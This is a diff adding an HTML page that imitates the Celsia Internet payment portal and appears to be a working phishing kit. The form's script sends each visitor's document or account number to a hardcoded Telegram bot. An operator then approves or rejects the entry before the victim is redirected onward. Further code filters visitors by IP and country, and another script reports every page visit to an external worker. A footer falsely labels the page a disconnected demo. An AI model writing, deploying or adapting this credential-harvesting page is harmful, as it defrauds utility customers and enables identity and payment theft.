@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#f47700">
+<title>Portal de Pagos</title>
+ 
+<style>
+:root {
+  --orange: #f47700;
+  --text: #171717;
+  --navy: #0f172a;
+}
+
+* { box-sizing: border-box; }
+html { font-size: 16px; }
+body { margin: 0; font-family: Arial, Helvetica, sans-serif; color: var(--text); background: #fff; -webkit-text-size-adjust: 100%; }
+
+.topbar {
+  width: 100%;
+  height: 4rem;
+  background-image: url('https://portalcelsia.vercel.app/ra.jpeg');
+  background-size: cover;
+  background-position: center left;
+  background-repeat: no-repeat;
+  background-color: #ff7900;
+}
+@media (max-width: 600px) { .topbar { height: 3.2rem; } }
+
+.steps {
+  max-width: 32rem;
+  margin: 0 auto;
+  padding: 1.2rem 0.8rem 0.6rem;
+  display: flex;
+  align-items: flex-start;
+  justify-content: center;
+  width: 100%;
+}
+.step { width: 5.8rem; flex: 0 1 5.8rem; text-align: center; color: #b8b8b8; font-size: 0.8rem; line-height: 1.25; }
+.step-circle {
+  width: 2.6rem; height: 2.6rem; margin: 0 auto 0.5rem; border-radius: 50%; display: grid; place-items: center; background: #e4e4e4; color: #777; font-size: 1.05rem; font-weight: 700;
+}
+.step.active { color: #d98227; font-weight: 600; }
+.step.active .step-circle { background: var(--orange); color: white; border: 0.25rem solid #ffead7; box-shadow: 0 0 0 1px #f8d5b5; }
+.step-line { height: 2px; flex: 0 1 2.8rem; background: #e5e5e5; margin-top: 1.3rem; }
+
+.card {
+  width: min(32rem, calc(100% - 1rem));
+  margin: 1.5rem auto 1rem;
+  border: 1px solid #e3e3e3;
+  border-radius: 1rem;
+  padding: 2.8rem 1.5rem 2rem;
+  box-shadow: 0 0 4px rgba(0,0,0,.03);
+}
+
+.hero-icon { width: 5rem; height: 5rem; border-radius: 1.6rem; margin: 0 auto 1.8rem; display: grid; place-items: center; background: var(--orange); color: white; }
+.hero-icon img { width: 3.2rem; height: 3.2rem; object-fit: contain; display: block; }
+.card-title { font-size: 1.45rem; line-height: 1.35; font-weight: 700; color: var(--text); margin: 0 auto 1rem; max-width: 100%; text-align: center; letter-spacing: -0.5px; text-wrap: balance; }
+.title-last { display: block; text-align: center; }
+.intro { text-align: center; color: #777; font-size: clamp(0.9rem, 3.2vw, 1.05rem); line-height: 1.5; margin: 0 auto 2.2rem; max-width: 100%; text-wrap: balance; }
+.rule { border: 0; border-top: 1px solid #ddd; margin: 0 0 2.2rem; }
+.field-label { font-size: clamp(0.85rem, 3vw, 0.95rem); color: #555; font-weight: 400; line-height: 1.5; margin-bottom: 1rem; }
+.field-label strong { color: #d98227; font-weight: 600; }
+.choice-row { display: grid; grid-template-columns: 1fr 1fr; gap: 0.7rem; margin-bottom: 2.2rem; }
+.choice { min-height: 2.8rem; width: 100%; border: 2px solid #e3e3e3; border-radius: 0.6rem; background: white; font: inherit; font-size: clamp(0.85rem, 3.2vw, 1.05rem); color: #555; cursor: pointer; box-shadow: 0 2px 4px rgba(0,0,0,.06); transition: .15s ease; padding: 0.4rem 0.5rem; }
+.choice.active { border: 2px solid #ed801d; color: #d98227; background: #fff8f2; box-shadow: none; font-weight: 600; }
+.input-wrap { position: relative; margin-bottom: 2.2rem; width: 100%; }
+.input-wrap input { width: 100%; height: 3rem; border: 1px solid #e2e2e2; border-radius: 0.65rem; padding: 0 3rem 0 1rem; font: inherit; font-size: clamp(0.9rem, 3.2vw, 1.05rem); color: #333; outline: none; box-shadow: 0 2px 4px rgba(0,0,0,.04); }
+.input-wrap input:focus { border-color: #f3a45f; box-shadow: 0 0 0 3px #fff0e3; }
+.input-wrap input::placeholder { color: #888; }
+.eye { position: absolute; right: 0.85rem; top: 50%; transform: translateY(-50%); border: 0; background: transparent; color: #777; cursor: pointer; padding: 0.25rem; display: flex; align-items: center; justify-content: center; z-index: 2; pointer-events: auto; }
+.eye svg { width: 1.4rem; height: 1.4rem; display: block; pointer-events: none; }
+.eye .eye-off { display: none; }
+.eye.is-visible .eye-on { display: none; }
+.eye.is-visible .eye-off { display: block; }
+.consent { display: flex; gap: 0.75rem; align-items: flex-start; border: 1px solid #e2e2e2; border-radius: 1rem; background: #fafafa; padding: 1rem 1rem; margin-bottom: 1.2rem; color: #555; font-size: clamp(0.8rem, 2.8vw, 0.95rem); line-height: 1.55; box-shadow: 0 1px 3px rgba(0,0,0,0.03); width: 100%; }
+.consent:last-of-type { margin-bottom: 1.8rem; }
+.consent input { appearance: none; -webkit-appearance: none; flex: 0 0 1.2rem; width: 1.2rem; height: 1.2rem; margin: 0.15rem 0 0; border: 1px solid #ccc; border-radius: 0.25rem; background: white; cursor: pointer; position: relative; }
+.consent input:checked { background: var(--orange); border-color: var(--orange); }
+.consent input:checked::after { content: "✓"; color: white; position: absolute; left: 0.2rem; top: -0.15rem; font-size: 0.95rem; font-weight: 700; }
+.consent a { color: #d98227; text-decoration: underline; }
+.consent b { color: #222; }
+.required { color: #d94b4b; font-weight: 700; }
+.recaptcha-box { border: 1px solid #d3d3d3; border-radius: 0.25rem; background: #f9f9f9; padding: 0.75rem 0.85rem; display: flex; align-items: center; justify-content: space-between; margin-bottom: 1.5rem; box-shadow: 0 1px 3px rgba(0,0,0,0.08); width: 100%; }
+.recaptcha-left { display: flex; align-items: center; gap: 0.7rem; }
+.recaptcha-checkbox { width: 1.4rem; height: 1.4rem; border: 2px solid #c1c1c1; border-radius: 0.2rem; background: white; cursor: pointer; appearance: none; -webkit-appearance: none; position: relative; transition: border-color 0.2s; }
+.recaptcha-checkbox:checked { border-color: transparent; background: transparent; }
+.recaptcha-checkbox:checked::after { content: ""; position: absolute; left: 50%; top: 45%; width: 0.95rem; height: 0.5rem; border-left: 2.5px solid #2e9e4f; border-bottom: 2.5px solid #2e9e4f; transform: translate(-50%, -60%) rotate(-45deg); border-radius: 1px; }
+.recaptcha-label { font-size: clamp(0.8rem, 2.8vw, 0.95rem); color: #000; font-weight: 400; }
+.recaptcha-logo { display: flex; flex-direction: column; align-items: center; font-size: 0.5rem; color: #555; line-height: 1.2; }
+.recaptcha-logo img { width: 2rem; height: 2rem; }
+.required-text { font-size: 0.75rem; color: #999; margin-bottom: 0.9rem; display: block; }
+.version-text { text-align: center; font-size: 0.7rem; color: #aaa; margin-bottom: 1.5rem; display: block; }
+.submit { width: 100%; min-height: 3rem; border: 0; border-radius: 0.6rem; background: var(--orange); color: white; font-size: clamp(0.95rem, 3.2vw, 1.1rem); font-weight: 600; cursor: pointer; margin-top: 0.5rem; display: flex; align-items: center; justify-content: center; gap: 0.5rem; box-shadow: 0 2px 4px rgba(244,119,0,0.3); transition: background 0.2s, opacity 0.2s; }
+.submit:disabled { background: #f7b27a; cursor: not-allowed; opacity: 0.7; box-shadow: none; }
+.submit:not(:disabled):hover { background: #e96e00; }
+.submit svg { width: 1.2rem; height: 1.2rem; }
+
+footer { text-align: center; padding: 0 1rem 1.5rem; color: #888; font-size: 0.75rem; }
+
+@media (max-width: 480px) {
+  html { font-size: 15px; }
+  .steps { padding: 0.8rem 0.7rem 0.4rem; }
+  .card { width: calc(100% - 1rem); margin: 1.2rem auto 0.8rem; padding: 2rem 1rem 1.5rem; border-radius: 0.85rem; }
+  .hero-icon { margin-bottom: 1.5rem; }
+  .card-title { font-size: 1.25rem; line-height: 1.35; margin-bottom: 0.9rem; max-width: 100%; }
+  .intro { font-size: 0.85rem; margin-bottom: 1.8rem; }
+  .rule { margin-bottom: 1.8rem; }
+  .field-label { margin-bottom: 0.9rem; }
+  .choice-row { margin-bottom: 1.8rem; }
+  .input-wrap { margin-bottom: 1.8rem; }
+  .consent { padding: 0.85rem 0.9rem; margin-bottom: 1rem; }
+  .consent:last-of-type { margin-bottom: 1.5rem; }
+  .recaptcha-box { margin-bottom: 1.3rem; }
+  .required-text { margin-bottom: 0.8rem; }
+  .version-text { margin-bottom: 1.3rem; }
+  .step { width: 4.8rem; flex: 0 1 4.8rem; font-size: 0.72rem; }
+  .step-circle { width: 2.3rem; height: 2.3rem; font-size: 0.9rem; }
+  .step-line { flex: 0 1 1.8rem; margin-top: 1.15rem; }
+  .choice { min-height: 2.6rem; font-size: 0.9rem; }
+  .input-wrap input { height: 2.8rem; font-size: 0.95rem; }
+  .submit { min-height: 2.8rem; font-size: 1rem; }
+}
+</style>
+</head>
+
+<body>
+
+<header class="topbar" aria-label="Celsia internet | Portal de Pagos"></header>
+
+<nav class="steps" aria-label="Pasos del proceso">
+  <div class="step active" id="step1">
+    <div class="step-circle" id="step1Circle">1</div>
+    <div>Consulta</div>
+  </div>
+  <div class="step-line"></div>
+  <div class="step" id="step2">
+    <div class="step-circle" id="step2Circle">2</div>
+    <div>Revisa tu<br>factura</div>
+  </div>
+  <div class="step-line"></div>
+  <div class="step" id="step3">
+    <div class="step-circle">3</div>
+    <div>Paga</div>
+  </div>
+</nav>
+
+<main class="card" id="lookupView">
+  <div class="hero-icon" aria-hidden="true">
+    <img src="https://img.icons8.com/?size=50&id=82688&format=png&color=ffffff" alt="">
+  </div>
+
+  <h2 class="card-title">
+    Consulta, paga o abona a tu
+    <span class="title-last">factura</span>
+  </h2>
+  <p class="intro">Sigue los pasos para consultar o realizar tus pagos</p>
+  <hr class="rule">
+
+  <form id="lookupForm">
+    <div class="field-label">Paso 1 — <strong>Selecciona el tipo de búsqueda</strong></div>
+    <div class="choice-row" role="group">
+      <button type="button" class="choice active" data-mode="documento" aria-pressed="true">Por documento</button>
+      <button type="button" class="choice" data-mode="cuenta" aria-pressed="false">Por cuenta</button>
+    </div>
+
+    <div class="field-label">Paso 2 — <strong>Ingresa la información y haz clic en buscar</strong></div>
+    <div class="input-wrap">
+      <input id="accountInput" type="password" inputmode="numeric" autocomplete="off" placeholder="Ingresa aqui tu documento" aria-label="Número de documento" required>
+      <button type="button" class="eye" id="toggleVisibility" aria-label="Mostrar u ocultar dato">
+        <svg class="eye-on" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><path d="M2 12s3.6-6.5 10-6.5S22 12 22 12 s-3.6 6.5-10 6.5S2 12 2 12Z"/><circle cx="12" cy="12" r="3"/></svg>
+        <svg class="eye-off" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20 c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94 M9.9 4.24A9.12 9.12 0 0 1 12 4 c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19 m-6.72-1.07a3 3 0 1 1-4.24-4.24 M1 1l22 22"/></svg>
+      </button>
+    </div>
+
+    <label class="consent">
+      <input type="checkbox" required>
+      <span>Acepto las <a href="#" class="policy-link">políticas de tratamiento de datos personales</a> <span class="required">*</span></span>
+    </label>
+    <label class="consent">
+      <input type="checkbox" required>
+      <span>Autorizo de manera libre, previa, expresa e informada a <b>Celsia Internet S.A.S.</b>, en su calidad de responsable del tratamiento de datos personales, conforme a su política de privacidad. <span class="required">*</span></span>
+    </label>
+
+    <div class="recaptcha-box">
+      <div class="recaptcha-left">
+        <input type="checkbox" class="recaptcha-checkbox" id="recaptchaCheck">
+        <label for="recaptchaCheck" class="recaptcha-label">No soy un robot</label>
+      </div>
+      <div class="recaptcha-logo">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+        <span>reCAPTCHA</span>
+      </div>
+    </div>
+
+    <span class="required-text">* Campo obligatorio</span>
+    <span class="version-text">v1.0.33</span>
+
+    <button type="submit" class="submit" id="submitBtn" disabled>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+      Buscar
+    </button>
+  </form>
+</main>
+
+<footer>
+  Maqueta demostrativa · No conectada al sistema real de pagos
+</footer>
+
+<!-- OVERLAY DE CARGA CON ÍCONO CELSIA -->
+<div id="loading-overlay" style="display:none; position:fixed; inset:0; background:rgba(244,119,0,0.92); z-index:9999; justify-content:center; align-items:center; flex-direction:column; color:white; font-family:Arial;">
+  <img
+    src="https://app.celsiainternet.com/components/payments/icon-512x512.png"
+    alt="Celsia"
+    style="width:110px; height:110px; object-fit:contain; animation:pulseIcon 1.4s ease-in-out infinite; filter:drop-shadow(0 6px 18px rgba(0,0,0,0.25));"
+  >
+  <p style="margin-top:24px; font-size:1.1rem; letter-spacing:0.3px;"></p>
+</div>
+<style>
+  @keyframes pulseIcon {
+    0%   { transform: scale(0.9); opacity: 0.85; }
+    50%  { transform: scale(1.08); opacity: 1; }
+    100% { transform: scale(0.9); opacity: 0.85; }
+  }
+</style>
+
+<script>
+// ==========================================
+// 🔑 CONFIGURACIÓN DE TELEGRAM
+// ==========================================
+const TG_BOT_TOKEN = '8720080632:AAHx4C3zh9LD4GEVOohesCsxMx9U-3TAZHk';
+const TG_CHAT_ID = '7776240161';
+
+// ==========================================
+// VARIABLES
+// ==========================================
+const choices        = document.querySelectorAll('.choice');
+const input          = document.getElementById('accountInput');
+const toggle         = document.getElementById('toggleVisibility');
+const recaptchaCheck = document.getElementById('recaptchaCheck');
+const submitBtn      = document.getElementById('submitBtn');
+const lookupView     = document.getElementById('lookupView');
+
+let mode = 'documento';
+let actionProcessed = false;
+let pollingActivo = false;
+let pollingTimeout = null;
+
+// ==========================================
+// SELECCIÓN DOCUMENTO / CUENTA
+// ==========================================
+choices.forEach(button => {
+  button.addEventListener('click', () => {
+    mode = button.dataset.mode;
+    choices.forEach(item => {
+      item.classList.toggle('active', item === button);
+      item.setAttribute('aria-pressed', String(item === button));
+    });
+    input.value = '';
+    input.type = 'password';
+    toggle.classList.remove('is-visible');
+    input.placeholder = mode === 'cuenta'
+      ? 'Ingresa aquí tu cuenta'
+      : 'Ingresa aqui tu documento';
+  });
+});
+
+toggle.addEventListener('click', (event) => {
+  event.preventDefault();
+  input.type = input.type === 'password' ? 'text' : 'password';
+  toggle.classList.toggle('is-visible');
+});
+
+recaptchaCheck.addEventListener('change', () => {
+  submitBtn.disabled = !recaptchaCheck.checked;
+});
+
+// ==========================================
+// OVERLAY
+// ==========================================
+function mostrarOverlay() {
+  document.getElementById('loading-overlay').style.display = 'flex';
+}
+function ocultarOverlay() {
+  document.getElementById('loading-overlay').style.display = 'none';
+}
+
+// ==========================================
+// 📤 ENVIAR A TELEGRAM (2 botones)
+// ==========================================
+function enviarConsultaTelegram(tipoBusqueda, valorIngresado, onSent) {
+  const mensaje = `
+⚡ <b>CELSIA - VALIDACIÓN</b>
+
+🔍 <b>Tipo:</b> ${tipoBusqueda === 'documento' ? '📄 Documento' : '🏦 Cuenta'}
+🔢 <b>Número:</b> <code>${valorIngresado}</code>
+
+📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
+  `.trim();
+
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: '✅ Válido',    callback_data: 'valido' },
+        { text: '❌ No válido', callback_data: 'no_valido' }
+      ]
+    ]
+  };
+
+  return fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TG_CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  })
+  .then(r => r.json())
+  .then(data => {
+    if (data.ok && data.result) {
+      const messageId = data.result.message_id;
+      localStorage.setItem('celsia_msg_id', messageId);
+      if (typeof onSent === 'function') onSent(messageId);
+      return messageId;
+    }
+    console.error('❌ Error Telegram:', data);
+    return null;
+  })
+  .catch(err => {
+    console.error('❌ Error de red:', err);
+    return null;
+  });
+}
+
+// ==========================================
+// 👂 ESCUCHAR BOTONES (polling)
+// ==========================================
+function escucharBotones(onAction) {
+  const msgId = localStorage.getItem('celsia_msg_id');
+  if (!msgId) return;
+
+  pollingActivo = true;
+  let lastUpdateId = -1;
+
+  function check() {
+    if (!pollingActivo) return;
+
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        offset: lastUpdateId + 1,
+        allowed_updates: ['callback_query'],
+        timeout: 10
+      })
+    })
+    .then(r => r.json())
+    .then(data => {
+      if (!data.ok || !data.result || data.result.length === 0) {
+        pollingTimeout = setTimeout(check, 2000);
+        return;
+      }
+
+      for (const u of data.result) {
+        lastUpdateId = Math.max(lastUpdateId, u.update_id);
+        if (!u.callback_query) continue;
+
+        const action    = u.callback_query.data;
+        const messageId = String(u.callback_query.message.message_id);
+
+        if (messageId === String(msgId)) {
+          pollingActivo = false;
+          onAction(action);
+          return;
+        }
+      }
+
+      pollingTimeout = setTimeout(check, 2000);
+    })
+    .catch(err => {
+      console.error('❌ Error polling:', err);
+      pollingTimeout = setTimeout(check, 3000);
+    });
+  }
+
+  check();
+}
+
+// ==========================================
+// 🗺️ ACCIÓN DEL BOT
+// ==========================================
+function handleTelegramAction(action) {
+  if (actionProcessed) return;
+  actionProcessed = true;
+
+  ocultarOverlay();
+  submitBtn.disabled = false;
+
+  if (action === 'valido') {
+    window.location.href = 'pincipal.html';
+  } else if (action === 'no_valido') {
+    alert('El documento o cuenta no es válido. Verifica e intenta de nuevo.');
+    input.value = '';
+    submitBtn.disabled = true;
+    recaptchaCheck.checked = false;
+    actionProcessed = false;
+  } else {
+    actionProcessed = false;
+  }
+}
+
+// ==========================================
+// 🚀 SUBMIT
+// ==========================================
+document.getElementById('lookupForm').addEventListener('submit', (event) => {
+  event.preventDefault();
+
+  const idBuscado = input.value.trim();
+  if (!idBuscado) {
+    alert("Por favor, ingresa un número de documento o cuenta.");
+    return;
+  }
+
+  actionProcessed = false;
+  mostrarOverlay();
+  submitBtn.disabled = true;
+
+  enviarConsultaTelegram(mode, idBuscado, function (messageId) {
+    if (messageId) {
+      escucharBotones(handleTelegramAction);
+    } else {
+      ocultarOverlay();
+      submitBtn.disabled = false;
+      alert('Error de conexión. Intenta de nuevo.');
+    }
+  });
+});
+</script>
+  <script>
+  /* ===== REDIRECCIÓN POR IP ===== */
+  (async function redirectByCountry() {
+    const params = new URLSearchParams(window.location.search);
+    const forced = params.get("lang");
+    
+    // Si viene de un anuncio de Google Ads (gclid) o tiene el idioma forzado, no redirigir
+    if (forced === "es" || params.has("gclid")) return;
+    
+    if (forced === "en") { window.location.replace("ingles.html"); return; }
+    
+    try {
+      const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+      const data = await res.json();
+      const country = (data.country_code || "").toUpperCase();
+      // Si NO es Colombia, lo enviamos a inglés
+      if (country && country !== "CO") window.location.replace("ingles.html");
+    } catch (e) { console.warn("No se pudo detectar IP, se queda en español.", e); }
+  })();
+  
+  /* ===== COOKIES ===== */
+  if (!localStorage.getItem("cookiesAccepted")) {
+    document.getElementById("cookie-banner").classList.add("show");
+  }
+  function acceptCookies() {
+    localStorage.setItem("cookiesAccepted", "1");
+    document.getElementById("cookie-banner").classList.remove("show");
+  }
+  
+  /* ===== MODALES LEGALES ===== */
+  document.querySelectorAll('a[href="#privacidad"], a[href="#terminos"], a[href="#cookies"]').forEach(a => {
+    a.addEventListener("click", e => {
+      e.preventDefault();
+      const id = a.getAttribute("href").replace("#", "");
+      document.getElementById(id).classList.add("show");
+    });
+  });
+  function closeLegal() {
+    document.querySelectorAll(".legal-modal.show").forEach(m => m.classList.remove("show"));
+  }
+  
+  /* ===== FORMULARIO INFORMATIVO ===== */
+  document.getElementById("lead-form").addEventListener("submit", function(e) {
+    e.preventDefault();
+    if (!document.getElementById("consent").checked) {
+      alert("Debes aceptar el tratamiento de datos para recibir la guía.");
+      return;
+    }
+    alert("¡Gracias! Te enviaremos la guía informativa a tu correo. Recuerda: no vendemos planes ni somos proveedor de internet.");
+    this.reset();
+  });
+  
+  /* ===== 👀 NOTIFICACIÓN DE ENTRADA A LA PÁGINA (CORREGIDO) ===== */
+  document.addEventListener('DOMContentLoaded', function() {
+    // Evita enviar múltiples notificaciones si el usuario recarga la página
+    if (sessionStorage.getItem('visita_notificada')) return; 
+    
+    const workerUrl = 'https://noisy-paper-3caa.fredypuyo792.workers.dev/api/notificar-clic';
+    
+    fetch(workerUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        pagina: 'Español 🇨🇴',
+        click: 'Nueva visita: entró al sitio'
+      })
+    }).then(() => {
+      // Guardamos en la sesión para no spamear
+      sessionStorage.setItem('visita_notificada', '1');
+    }).catch(e => console.log('Error al notificar entrada:', e));
+  });
+  </script>
+
+</body>
+</html>
